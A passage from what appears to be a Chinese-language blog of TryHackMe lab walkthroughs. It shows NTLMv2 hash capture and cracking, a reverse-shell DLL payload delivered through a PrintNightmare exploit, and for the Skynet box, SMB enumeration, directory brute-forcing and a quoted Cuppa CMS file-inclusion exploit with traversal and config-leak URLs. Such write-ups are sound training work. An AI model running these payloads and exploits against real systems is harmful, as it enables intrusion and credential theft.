class="code"><pre><code class="hljs bash"><span class="hljs-variable">$sudo</span> responder -I tun0<br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0<br><br>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br>  To <span class="hljs-built_in">kill</span> this script hit CTRL-C<br>  <br>  [+] Listening <span class="hljs-keyword">for</span> events...<br><br>[SMB] NTLMv2-SSP Client   : 10.10.43.168<br>[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security<br>[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:da836369b9380f4b:3CC0F0C76D0609CB13DFDCD7D5B0FAAB:010100000000000080B17D5DE088D801BE7A96CFAB37D1CE0000000002000800470053004C00460001001E00570049004E002D003500510030003600580054004600300059005900450004003400570049004E002D00350051003000360058005400460030005900590045002E00470053004C0046002E004C004F00430041004C0003001400470053004C0046002E004C004F00430041004C0005001400470053004C0046002E004C004F00430041004C000700080080B17D5DE088D8010600040002000000080030003000000000000000000000000030000044BC5BB5D7BA89833787B5E3EEAB0D80BED3613C9C1839233D47D4651103570C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310033002E00340033002E00320033003800000000000000000<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$hashcat</span> -m 5600 ntlmv2 /usr/share/wordlists/rockyou.txt<br><br>Watchdog: Hardware monitoring interface not found on your system.<br>Watchdog: Temperature abort trigger disabled.<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 66 MB<br><br>Dictionary cache built:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344392<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br>* Runtime...: 1 sec<br><br>ENTERPRISE-SECURITY::VULNNET:da836369b9380f4b:3cc0f0c76d0609cb13dfdcd7d5b0faab:010100000000000080b17d5de088d801be7a96cfab37d1ce0000000002000800470053004c00460001001e00570049004e002d003500510030003600580054004600300059005900450004003400570049004e002d00350051003000360058005400460030005900590045002e00470053004c0046002e004c004f00430041004c0003001400470053004c0046002e004c004f00430041004c0005001400470053004c0046002e004c004f00430041004c000700080080b17d5de088d8010600040002000000080030003000000000000000000000000030000044bc5bb5d7ba89833787b5e3eeab0d80bed3613c9c1839233d47d4651103570c0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310033002e00340033002e003200330038000000000000000000:sand_0873959498<br>                                                 <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Name........: NetNTLMv2<br>Hash.Target......: ENTERPRISE-SECURITY::VULNNET:da836369b9380f4b:3cc0f...000000<br>Time.Started.....: Sat Jun 25 22:15:02 2022 (2 secs)<br>Time.Estimated...: Sat Jun 25 22:15:04 2022 (0 secs)<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:  2606.4 kH/s (2.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8</span><br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 4014080/14344385 (27.98%)<br>Rejected.........: 0/4014080 (0.00%)<br>Restore.Point....: 4005888/14344385 (27.93%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br>Candidates.<span class="hljs-comment">#1....: sanjayram -&gt; sand418</span><br></code></pre></td></tr></table></figure><p>有了凭证便可以尝试漏洞利用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$msfvenom</span> -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.75.230 LPORT=1337 -f dll &gt; exp.dll<br><span class="hljs-variable">$sudo</span> smbserver.py share . -smb2support<br>Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation<br><br>[*] Config file parsed<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0<br>[*] Config file parsed<br>[*] Config file parsed<br>[*] Config file parsed<br></code></pre></td></tr></table></figure><p>启动对应监听模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$python3</span> CVE-2021-1675.py VULNNET/enterprise-security:<span class="hljs-string">&#x27;sand_0873959498&#x27;</span>@10.10.43.168 <span class="hljs-string">&#x27;\\10.11.75.230\share\exp.dll&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[msf]</span>(<span class="hljs-attribute">Jobs</span>:<span class="hljs-number">0</span> <span class="hljs-attribute">Agents</span>:<span class="hljs-number">0</span>) <span class="hljs-selector-tag">exploit</span>(multi/handler) &gt;&gt; <span class="hljs-selector-tag">run</span> <br><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Started</span> <span class="hljs-selector-tag">reverse</span> <span class="hljs-selector-tag">TCP</span> <span class="hljs-selector-tag">handler</span> <span class="hljs-selector-tag">on</span> <span class="hljs-number">10.11</span><span class="hljs-selector-class">.75</span><span class="hljs-selector-class">.230</span>:<span class="hljs-number">1337</span> <br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">stage</span> (<span class="hljs-number">200774</span> bytes) <span class="hljs-selector-tag">to</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.168</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Meterpreter</span> <span class="hljs-selector-tag">session</span> <span class="hljs-number">1</span> <span class="hljs-selector-tag">opened</span> (<span class="hljs-number">10.11</span>.<span class="hljs-number">75.230</span>:<span class="hljs-number">1337</span> -&gt; <span class="hljs-number">10.10</span>.<span class="hljs-number">43.168</span>:<span class="hljs-number">49808</span>) <span class="hljs-selector-tag">at</span> <span class="hljs-number">2022</span><span class="hljs-selector-tag">-06-25</span> <span class="hljs-number">23</span>:<span class="hljs-number">06</span>:<span class="hljs-number">25</span> +<span class="hljs-number">0800</span><br><br>(Meterpreter <span class="hljs-number">1</span>)(<span class="hljs-attribute">C</span>:\Windows\system32) &gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TryHackMe Walkthrough - Skynet</title>
    <link href="/post/Tryhackme-Skynet.html"/>
    <url>/post/Tryhackme-Skynet.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ sudo nmap -sC -sV 10.10.109.181 -p22,80,110,139,143,445 -oN Skynet -Pn                          255 ⨯<br>[sudo] crazyinside 的密码：<br>Starting Nmap 7.92SVN ( https://google.com ) at 2022-07-20 13:58 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.109.181<br>Host is up (0.34s latency).<br><br>PORT    STATE SERVICE     VERSION<br>22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)<br>|   256 57c07502712d193183dbe4fe679668cf (ECDSA)<br>|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)<br>80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Skynet<br>110/tcp open  pop3        Dovecot pop3d<br>|_pop3-capabilities: PIPELINING SASL AUTH-RESP-CODE TOP RESP-CODES CAPA UIDL<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>143/tcp open  imap        Dovecot imapd<br>|_imap-capabilities: ENABLE LOGIN-REFERRALS post-login have more listed SASL-IR capabilities OK LOGINDISABLEDA0001 Pre-login IDLE ID IMAP4rev1 LITERAL+<br>445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-07-20T05:58:19<br>|_  start_date: N/A<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: skynet<br>|   NetBIOS computer name: SKYNET\x00<br>|   Domain name: \x00<br>|   FQDN: skynet<br>|_  System time: 2022-07-20T00:58:19-05:00<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 25.58 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.109.181 -p22,80,110,139,143,445 -oN Skynet -Pn<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ smbmap -H 10.10.109.181 -u <span class="hljs-built_in">whoami</span>                                <br>[+] Guest session       IP: 10.10.109.181:445   Name: 10.10.109.181                                     <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        <span class="hljs-built_in">print</span>$                                                  NO ACCESS       Printer Drivers<br>        anonymous                                               READ ONLY       Skynet Anonymous Share<br>        milesdyson                                              NO ACCESS       Miles Dyson Personal Share<br>        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))<br>                                                                                                                      <br>Crazyinside:~/HTB$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ smbclient //10.10.109.181/anonymous -U <span class="hljs-built_in">whoami</span><br>Password <span class="hljs-keyword">for</span> [WORKGROUP\<span class="hljs-built_in">whoami</span>]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Fri Nov 27 00:04:00 2020<br>  ..                                  D        0  Tue Sep 17 15:20:17 2019<br>  attention.txt                       N      163  Wed Sep 18 11:04:59 2019<br>  logs                                D        0  Wed Sep 18 12:42:16 2019<br><br>                9204224 blocks of size 1024. 5831512 blocks available<br>smb: \&gt; mget attention.txt <br>Get file attention.txt? y<br>getting file \attention.txt of size 163 as attention.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)<br>smb: \&gt; <span class="hljs-built_in">cd</span> logs<br>smb: \logs\&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Wed Sep 18 12:42:16 2019<br>  ..                                  D        0  Fri Nov 27 00:04:00 2020<br>  log2.txt                            N        0  Wed Sep 18 12:42:13 2019<br>  log1.txt                            N      471  Wed Sep 18 12:41:59 2019<br>  log3.txt                            N        0  Wed Sep 18 12:42:16 2019<br><br>                9204224 blocks of size 1024. 5831512 blocks available<br>smb: \logs\&gt; mget *<br>Get file log2.txt? y<br>getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)<br>Get file log1.txt? y<br>getting file \logs\log1.txt of size 471 as log1.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)<br>Get file log3.txt? y<br>getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)<br>smb: \logs\&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">log</span>*.txt<br>cyborg007haloterminator<br>terminator22596<br>terminator219<br>terminator20<br>terminator1989<br>terminator1988<br>terminator168<br>terminator16<br>terminator143<br>terminator13<br>terminator123!@<span class="hljs-comment">#</span><br>terminator1056<br>terminator101<br>terminator10<br>terminator02<br>terminator00<br>roboterminator<br>pongterminator<br>manasturcaluterminator<br>exterminator95<br>exterminator200<br>dterminator<br>djxterminator<br>dexterminator<br>determinator<br>cyborg007haloterminator<br>avsterminator<br>alonsoterminator<br>Walterminator<br>79terminator6<br>1996terminator<br>                                                                                                                      <br>Crazyinside:~/HTB$ <span class="hljs-built_in">cat</span> attention.txt <br>A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.<br>-Miles Dyson<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720140211930.png" alt="image-20220720140211930"></p><p>访问80端口只有一个假的搜索页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">[21:08:44] Starting: <br>[21:08:48] 301 -  309B  - /js  -&gt;  http://10.10.27.117/js/<br>[21:08:56] 403 -  277B  - /.ht_wsr.txt<br>[21:08:57] 403 -  277B  - /.htaccess.bak1<br>[21:08:57] 403 -  277B  - /.htaccess.orig<br>[21:08:57] 403 -  277B  - /.htaccess.save<br>[21:08:57] 403 -  277B  - /.htaccess.sample<br>[21:08:57] 403 -  277B  - /.htaccess_extra<br>[21:08:57] 403 -  277B  - /.htaccess_sc<br>[21:08:57] 403 -  277B  - /.htaccess_orig<br>[21:08:57] 403 -  277B  - /.htaccessBAK<br>[21:08:57] 403 -  277B  - /.htaccessOLD2<br>[21:08:57] 403 -  277B  - /.htaccessOLD<br>[21:08:57] 403 -  277B  - /.html<br>[21:08:57] 403 -  277B  - /.htm<br>[21:08:57] 403 -  277B  - /.htpasswd_test<br>[21:08:57] 403 -  277B  - /.htpasswds<br>[21:08:57] 403 -  277B  - /.httr-oauth<br>[21:09:00] 403 -  277B  - /.php<br>[21:09:00] 403 -  277B  - /.php3<br>[21:09:23] 301 -  312B  - /admin  -&gt;  http://10.10.27.117/admin/<br>[21:09:24] 403 -  277B  - /admin/.htaccess<br>[21:09:24] 403 -  277B  - /admin/?/login<br>[21:09:25] 403 -  277B  - /admin/<br>[21:09:55] 301 -  313B  - /config  -&gt;  http://10.10.27.117/config/<br>[21:09:56] 403 -  277B  - /config/<br>[21:09:59] 301 -  310B  - /css  -&gt;  http://10.10.27.117/css/<br>[21:10:18] 200 -  523B  - /index.html<br>[21:10:21] 403 -  277B  - /js/<br>[21:10:55] 403 -  277B  - /server-status/<br>[21:10:55] 403 -  277B  - /server-status<br>[21:11:01] 301 -  319B  - /squirrelmail  -&gt;  http://10.10.27.117/squirrelmail/<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720211808317.png" alt="image-20220720211808317"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720212145262.png" alt="image-20220720212145262"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720213544122.png" alt="image-20220720213544122"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720214217633.png" alt="image-20220720214217633"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720214249272.png" alt="image-20220720214249272"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ smbclient //10.10.27.117/milesdyson -U milesdyson                                                                                                                                                                     130 ⨯<br><br>Password <span class="hljs-keyword">for</span> [WORKGROUP\milesdyson]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Tue Sep 17 17:05:47 2019<br>  ..                                  D        0  Wed Sep 18 11:51:03 2019<br>  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 17:05:14 2019<br>  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 17:05:14 2019<br>  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 17:05:14 2019<br>  notes                               D        0  Tue Sep 17 17:18:40 2019<br>  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 17:05:14 2019<br>  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 17:05:14 2019<br><br>                9204224 blocks of size 1024. 5827844 blocks available<br>smb: \&gt; <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720214946709.png" alt="image-20220720214946709"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB/notes$ <span class="hljs-built_in">cat</span> important.txt <br><br>1. Add features to beta CMS /45kra24zxs28v3yd<br>2. Work on T-800 Model 101 blueprints<br>3. Spend more time with my wife<br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB/notes$ <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720215102870.png" alt="image-20220720215102870"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">[21:51:48] Starting: <br>[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.ht_wsr.txt<br>[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess.bak1<br>[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess.orig<br>[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess.save<br>[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess.sample<br>[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess_extra<br>[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess_orig<br>[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccess_sc<br>[21:52:00] 403 -  277B  - /45kra24zxs28v3yd/.htaccessBAK<br>[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.htaccessOLD<br>[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.htaccessOLD2<br>[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.htm<br>[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.html<br>[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.htpasswd_test<br>[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.htpasswds<br>[21:52:01] 403 -  277B  - /45kra24zxs28v3yd/.httr-oauth<br>[21:52:04] 403 -  277B  - /45kra24zxs28v3yd/.php<br>[21:52:04] 403 -  277B  - /45kra24zxs28v3yd/.php3<br>[21:52:48] 301 -  337B  - /45kra24zxs28v3yd/administrator  -&gt;  http://10.10.27.117/45kra24zxs28v3yd/administrator/<br>[21:52:48] 403 -  277B  - /45kra24zxs28v3yd/administrator/.htaccess<br>[21:52:48] 200 -    5KB - /45kra24zxs28v3yd/administrator/<br>[21:52:48] 200 -    5KB - /45kra24zxs28v3yd/administrator/index.php<br>[21:53:26] 200 -  418B  - /45kra24zxs28v3yd/index.html<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720223015224.png" alt="image-20220720223015224"></p><p>刚刚的密码账号不能用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB/notes$ searchsploit cuppa                                <br>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                                                                                                               |  Path<br>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Cuppa CMS - <span class="hljs-string">&#x27;/alertConfigField.php&#x27;</span> Local/Remote File Inclusion                                                                                                                                              | php/webapps/25971.txt<br>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB/notes$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]<br><br><span class="hljs-comment">#####################################################</span><br>EXPLOIT<br><span class="hljs-comment">#####################################################</span><br><br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?<br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd<br><br>Moreover, We could access Configuration.php <span class="hljs-built_in">source</span> code via PHPStream<br><br>For Example:<br>-----------------------------------------------------------------------------<br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php<br>-----------------------------------------------------------------------------<br><br>Base64 Encode Output:<br>-----------------------------------------------------------------------------<br>PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+<br>-----------------------------------------------------------------------------<br></code></pre></td></tr></table></figure><p><img 